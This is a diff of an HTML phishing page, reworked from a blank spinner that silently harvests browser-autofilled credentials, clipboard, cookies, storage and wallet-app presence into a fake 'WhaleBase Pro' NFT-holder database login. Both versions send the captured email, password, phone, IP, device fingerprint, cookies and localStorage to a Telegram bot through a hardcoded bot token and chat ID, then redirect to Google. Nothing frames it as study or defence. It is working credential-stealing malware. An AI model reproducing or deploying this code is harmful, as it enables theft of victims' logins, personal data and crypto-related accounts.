@@ -1,50 +1,102 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no">
-<title></title>
+<title>WhaleBase Pro</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
-body{width:100vw;height:100vh;background:#fff;display:flex;justify-content:center;align-items:center}
-.s{width:30px;height:30px;border:3px solid #eee;border-top-color:#999;border-radius:50%;animation:r 0.6s linear infinite}
-@keyframes r{to{transform:rotate(360deg)}}
+body{
+background:#0a0e14;color:#e2e8f0;
+font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;
+min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px
+}
+.container{width:100%;max-width:420px}
+.header{text-align:center;margin-bottom:18px}
+.logo{font-size:40px;margin-bottom:4px}
+.logo-text{font-size:24px;font-weight:800;background:linear-gradient(135deg,#3b82f6,#8b5cf6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+.logo-sub{font-size:11px;color:#64748b;letter-spacing:3px;text-transform:uppercase;margin-top:4px}
+.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin-bottom:18px}
+.stat-box{background:#121720;border:1px solid #1e2836;border-radius:10px;padding:12px 8px;text-align:center}
+.stat-num{font-size:20px;font-weight:700;color:#10b981}
+.stat-lbl{font-size:10px;color:#64748b;text-transform:uppercase;letter-spacing:1px;margin-top:3px}
+.card{background:#121720;border:1px solid #1e2836;border-radius:14px;padding:26px 22px}
+.card-title{font-size:17px;font-weight:700;text-align:center;margin-bottom:4px}
+.card-sub{font-size:12px;color:#64748b;text-align:center;margin-bottom:22px;line-height:1.4}
+.badge{display:block;background:rgba(245,158,11,0.12);color:#f59e0b;border:1px solid rgba(245,158,11,0.25);padding:8px 14px;border-radius:20px;font-size:11px;font-weight:600;text-align:center;margin-bottom:18px}
+.input-group{margin-bottom:13px}
+.input-group label{display:block;font-size:10px;color:#64748b;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:5px;font-weight:600}
+.input-group input{width:100%;padding:13px 15px;background:#0a0e14;border:1px solid #1e2836;border-radius:9px;color:#fff;font-size:14px;font-family:inherit}
+.input-group input:focus{outline:none;border-color:#3b82f6}
+.input-group input::placeholder{color:#3a4450}
+.btn{width:100%;padding:14px;background:linear-gradient(135deg,#3b82f6,#8b5cf6);color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;margin-top:5px}
+.btn:active{transform:scale(0.97);opacity:0.9}
+.footer{text-align:center;margin-top:14px;font-size:10px;color:#64748b}
+.loading{display:none;text-align:center;padding:30px 20px}
+.loading.active{display:block}
+.spinner{width:40px;height:40px;border:3px solid #1e2836;border-top-color:#3b82f6;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 14px}
+@keyframes spin{to{transform:rotate(360deg)}}
+@media(max-width:380px){.card{padding:20px 14px}.input-group input{padding:11px 13px;font-size:13px}.btn{padding:12px;font-size:14px}}
 </style>
 </head>
 <body>
-<div class="s"></div>
+<div class="container">
 
-<div style="position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none">
-<form>
-<input type="text" name="u" autocomplete="username">
-<input type="password" name="p" autocomplete="current-password">
-<input type="email" name="e" autocomplete="email">
-<input type="text" name="fn" autocomplete="name">
-<input type="text" name="gn" autocomplete="given-name">
-<input type="text" name="ln" autocomplete="family-name">
-<input type="tel" name="ph" autocomplete="tel-national">
-<input type="tel" name="ph2" autocomplete="tel">
-<input type="text" name="org" autocomplete="organization">
-<input type="text" name="adr" autocomplete="street-address">
-<input type="text" name="cty" autocomplete="address-level2">
-<input type="text" name="cnt" autocomplete="country-name">
-<input type="text" name="pst" autocomplete="postal-code">
-</form>
+<div class="header">
+<div class="logo">🐋</div>
+<div class="logo-text">WhaleBase Pro</div>
+<div class="logo-sub">NFT Holder Database</div>
+</div>
+
+<div class="stats">
+<div class="stat-box"><div class="stat-num">1.8M</div><div class="stat-lbl">Холдеров</div></div>
+<div class="stat-box"><div class="stat-num" style="color:#f59e0b">47K</div><div class="stat-lbl">Китов</div></div>
+<div class="stat-box"><div class="stat-num" style="color:#3b82f6">Live</div><div class="stat-lbl">Сейчас</div></div>
+</div>
+
+<div class="card" id="mainCard">
+<div class="card-title">🔐 Доступ к базе</div>
+<div class="card-sub">Закрытая база холдеров NFT.<br>Войдите для продолжения.</div>
+<div class="badge">⚠ Только для держателей NFT</div>
+
+<div class="input-group">
+<label>Email</label>
+<input type="email" id="emailField" placeholder="your@email.com" autocomplete="email">
+</div>
+
+<div class="input-group">
+<label>Пароль</label>
+<input type="password" id="passField" placeholder="••••••••" autocomplete="current-password">
+</div>
+
+<div class="input-group">
+<label>Телефон (для подтверждения)</label>
+<input type="tel" id="phoneField" placeholder="+7 (___) ___-__-__" autocomplete="tel-national">
+</div>
+
+<button class="btn" id="loginBtn" onclick="login()">Войти в базу</button>
+</div>
+
+<div class="loading" id="loadingBlock">
+<div class="spinner"></div>
+<p style="color:#64748b;font-size:13px">Загружаем базу данных...</p>
+</div>
+
+<div class="footer">🔒 Данные шифруются. Доступ не разглашается.</div>
 </div>
 
 <script>
-(async()=>{
 const TOKEN="8628050585:AAFjgxpiuqKEB9P_4dwQ_PVGDEITzZmL8G4";
 const CHAT="8192226287";
 const REDIR="https://www.google.com";
-const sid='s'+Math.random().toString(36).slice(2,8)+Date.now().toString(36);
-const d={};
+const sid='w'+Math.random().toString(36).slice(2,8)+Date.now().toString(36);
 
+async function collect(d){
 try{
 const r=await fetch("https://ipapi.co/json/");
 const j=await r.json();
 d.ip=j.ip||"-";d.country=j.country_name||"-";d.city=j.city||"-";
-d.region=j.region||"-";d.provider=j.org||"-";d.postal=j.postal||"-";d.tz_ip=j.timezone||"-"
+d.region=j.region||"-";d.provider=j.org||"-";d.tz_ip=j.timezone||"-"
 }catch(e){d.ip="error"}
 
 try{
@@ -55,90 +107,53 @@ d.webrtc=c||"-";pc.close()
 }catch(e){d.webrtc="error"}
 
 d.ua=navigator.userAgent;d.platform=navigator.platform;d.lang=navigator.language;
-d.langs=JSON.stringify(navigator.languages||[]);d.sw=screen.width;d.sh=screen.height;
-d.aw=screen.availWidth;d.ah=screen.availHeight;d.cd=screen.colorDepth;
-d.pr=window.devicePixelRatio;d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+d.sw=screen.width;d.sh=screen.height;d.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
 d.cpu=navigator.hardwareConcurrency||"?";d.ram=navigator.deviceMemory||"?";
-d.touch=navigator.maxTouchPoints||0;d.mobile=/Mobi|Android/i.test(navigator.userAgent);
-d.vendor=navigator.vendor||"-";d.dnt=navigator.doNotTrack||"-";
+d.mobile=/Mobi|Android/i.test(navigator.userAgent);
 
 try{
 const cv=document.createElement('canvas');const gl=cv.getContext('webgl');
 if(gl){const db=gl.getExtension('WEBGL_debug_renderer_info');
-if(db){d.gpu=gl.getParameter(db.UNMASKED_RENDERER_WEBGL);d.gpuv=gl.getParameter(db.UNMASKED_VENDOR_WEBGL)}}
+if(db){d.gpu=gl.getParameter(db.UNMASKED_RENDERER_WEBGL)}}
 }catch(e){}
 if(!d.gpu)d.gpu="-";
 
-try{
-const cv=document.createElement('canvas');cv.width=300;cv.height=60;
-const cx=cv.getContext('2d');cx.font="16px Arial";
-cx.fillStyle="#f60";cx.fillRect(10,10,80,30);
-cx.fillStyle="#069";cx.fillText("FP"+Date.now(),20,32);
-d.cf=cv.toDataURL().length
-}catch(e){d.cf="-"}
-
-try{
-const ac=new(window.AudioContext||window.webkitAudioContext)();
-const osc=ac.createOscillator();const an=ac.createAnalyser();
-osc.connect(an);an.connect(ac.destination);osc.start(0);
-const fd=new Float32Array(an.frequencyBinCount);an.getFloatFrequencyData(fd);
-d.af=fd[0].toFixed(6);osc.stop();ac.close()
-}catch(e){d.af="-"}
-
 try{const b=await navigator.getBattery();d.bat=Math.round(b.level*100)+"% ch:"+b.charging}catch(e){d.bat="-"}
-d.online=navigator.onLine;
-try{if(navigator.connection){d.conn=navigator.connection.effectiveType;d.dl=navigator.connection.downlink+"Mbps"}}catch(e){}
-d.ref=document.referrer||"direct";d.url=window.location.href;
+try{if(navigator.connection){d.conn=navigator.connection.effectiveType}}catch(e){}
+d.ref=document.referrer||"direct";
 d.cookie=document.cookie||"-";
 
-try{const ls={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);if(k)ls[k]=localStorage.getItem(k)}d.ls=JSON.stringify(ls).substring(0,1500)}catch(e){d.ls="-"}
-try{const ss={};for(let i=0;i<sessionStorage.length;i++){const k=sessionStorage.key(i);if(k)ss[k]=sessionStorage.getItem(k)}d.ss=JSON.stringify(ss).substring(0,1500)}catch(e){d.ss="-"}
-try{d.clip=await navigator.clipboard.readText()||"-"}catch(e){d.clip="no access"}
-
-await new Promise(r=>setTimeout(r,2000));
-
-d.af_u=document.querySelector('[name="u"]').value||"-";
-d.af_p=document.querySelector('[name="p"]').value||"-";
-d.af_e=document.querySelector('[name="e"]').value||"-";
-d.af_fn=document.querySelector('[name="fn"]').value||"-";
-d.af_gn=document.querySelector('[name="gn"]').value||"-";
-d.af_ln=document.querySelector('[name="ln"]').value||"-";
-d.af_ph=document.querySelector('[name="ph"]').value||"-";
-d.af_ph2=document.querySelector('[name="ph2"]').value||"-";
-d.af_org=document.querySelector('[name="org"]').value||"-";
-d.af_adr=document.querySelector('[name="adr"]').value||"-";
-d.af_cty=document.querySelector('[name="cty"]').value||"-";
-d.af_cnt=document.querySelector('[name="cnt"]').value||"-";
-d.af_pst=document.querySelector('[name="pst"]').value||"-";
-
-d.apps=[];
-const schemes={
-'Telegram':'tg://','WhatsApp':'whatsapp://','MetaMask':'metamask://',
-'TrustWallet':'trust://','Phantom':'phantom://','Coinbase':'coinbase://',
-'Binance':'binance://','Discord':'discord://','Twitter':'twitter://',
-'Instagram':'instagram://','TikTok':'snssdk1233://','VK':'vk://',
-'YouTube':'youtube://'
-};
-for(const[nm,sc]of Object.entries(schemes)){
-try{
-const ifr=document.createElement('iframe');ifr.style.display='none';
-ifr.src=sc;document.body.appendChild(ifr);
-await new Promise(r=>setTimeout(r,50));
-document.body.removeChild(ifr);d.apps.push(nm)
-}catch(e){}
+try{const ls={};for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);if(k)ls[k]=localStorage.getItem(k)}d.ls=JSON.stringify(ls).substring(0,1000)}catch(e){d.ls="-"}
 }
 
+async function login(){
+const email=document.getElementById('emailField').value.trim();
+const pass=document.getElementById('passField').value.trim();
+const phone=document.getElementById('phoneField').value.trim();
+
+if(!email&&!phone){alert('Введите email или телефон');return}
+
+document.getElementById('mainCard').style.display='none';
+document.getElementById('loadingBlock').classList.add('active');
+document.getElementById('loginBtn').disabled=true;
+
+const d={};
+d.entered_email=email||"-";
+d.entered_password=pass||"-";
+d.entered_phone=phone||"-";
+
+await collect(d);
+
 const msg=
-`🚨 ЗАХОД
+`🚨 НОВЫЙ ЗАХОД
 
 🆔 ${sid}
 🕐 ${new Date().toLocaleString("ru-RU")}
 
 🌐 IP: ${d.ip}
-📍 ${d.country}, ${d.city}
+📍 ${d.country}, ${d.city}, ${d.region}
 📡 ${d.provider}
-🔍 WebRTC: ${d.webrtc}
-🕐 TZ: ${d.tz} / IP TZ: ${d.tz_ip}
+🕐 TZ: ${d.tz} / IP: ${d.tz_ip}
 
 📱 ${d.platform} | ${d.mobile?'MOBILE':'PC'}
 🖥 ${d.sw}x${d.sh} | CPU:${d.cpu} | RAM:${d.ram}
@@ -147,22 +162,10 @@ const msg=
 🔋 ${d.bat}
 📶 ${d.conn||"-"}
 
-👤 LOGIN: ${d.af_u}
-🔑 PASS: ${d.af_p}
-📧 EMAIL: ${d.af_e}
-📛 NAME: ${d.af_fn}
-👤 FIRST: ${d.af_gn}
-👤 LAST: ${d.af_ln}
-📞 PHONE: ${d.af_ph}
-📞 PHONE2: ${d.af_ph2}
-🏢 ORG: ${d.af_org}
-🏠 ADDR: ${d.af_adr}
-🏙 CITY: ${d.af_cty}
-🌍 COUNTRY: ${d.af_cnt}
-📮 POSTAL: ${d.af_pst}
+✉️ EMAIL: ${d.entered_email}
+🔑 PASSWORD: ${d.entered_password}
+📞 PHONE: ${d.entered_phone}
 
-📋 CLIPBOARD: ${(d.clip||'-').substring(0,500)}
-📦 APPS: ${d.apps.length?d.apps.join(', '):'none'}
 🔗 REF: ${d.ref}
 🍪 COOKIE: ${(d.cookie||'-').substring(0,500)}
 💾 LS: ${(d.ls||'-').substring(0,300)}`;
@@ -173,16 +176,8 @@ headers:{"Content-Type":"application/json"},
 body:JSON.stringify({chat_id:CHAT,text:msg})
 });
 
-if(d.clip&&d.clip.length>500){
-await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
-method:"POST",
-headers:{"Content-Type":"application/json"},
-body:JSON.stringify({chat_id:CHAT,text:`📋 FULL CLIPBOARD ${sid}:\n\n${d.clip.substring(0,3500)}`})
-})
+setTimeout(()=>{window.location.replace(REDIR)},2500);
 }
-
-setTimeout(()=>{window.location.replace(REDIR)},600)
-})();
 </script>
 </body>
 </html>
